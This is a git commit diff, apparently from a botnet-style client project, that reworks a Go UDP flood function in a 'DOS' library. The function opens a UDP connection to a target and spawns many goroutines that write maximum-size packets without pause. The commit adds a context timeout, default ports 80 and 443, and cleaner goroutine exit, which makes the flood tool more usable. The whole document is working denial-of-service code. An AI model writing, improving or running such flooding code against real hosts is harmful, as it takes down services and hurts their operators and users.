818283c1534bd730672ca9a56f368868defc0544
Xart3mis <ihavemanywaifus@protonmail.com>
2022-10-14 08:29:35 +0200

    check for https and fix not goroutines not exiting after timeout

--- Client/lib/DOS/udpflood/udpflood.go
+++ Client/lib/DOS/udpflood/udpflood.go
@@ -1,36 +1,54 @@
 package udpflood
 
 import (
+	"context"
 	"fmt"
 	"net"
 	"net/url"
+	"strings"
 	"time"
 )
 
 func UdpFloodUrl(host string, threadsN int64, timeout time.Duration) error {
+	ctx, cancel := context.WithTimeout(context.Background(), timeout)
+	defer cancel()
+
 	_url, err := url.Parse(host)
 	if err != nil {
 		return err
 	}
 
+	_host := _url.Host
+	if !strings.Contains(host, ":") {
+		if _url.Scheme == "https" {
+			_host = fmt.Sprintf("%s:%s", _url.Host, "443")
+		} else {
+			_host = fmt.Sprintf("%s:%s", _url.Host, "80")
+		}
+	}
+
 	buf := make([]byte, 65507)
 
 	//Establish udp
-	conn, err := net.Dial("udp", _url.Host)
+	conn, err := net.Dial("udp", _host)
 	if err != nil {
 		fmt.Println(err)
 	} else {
-		fmt.Printf("Flooding %s\n", _url.Host)
-		for i := 0; i < int(threadsN); i++ {
+		fmt.Printf("Flooding %s\n", _url.String())
+		for i := int64(0); i < threadsN; i++ {
 			go func() {
 				for {
-					conn.Write(buf)
+					select {
+					case <-ctx.Done():
+						return
+					default:
+						conn.Write(buf)
+					}
 				}
 			}()
 		}
 	}
 
-	//Sleep forever
 	<-time.After(timeout)
 
 	return nil
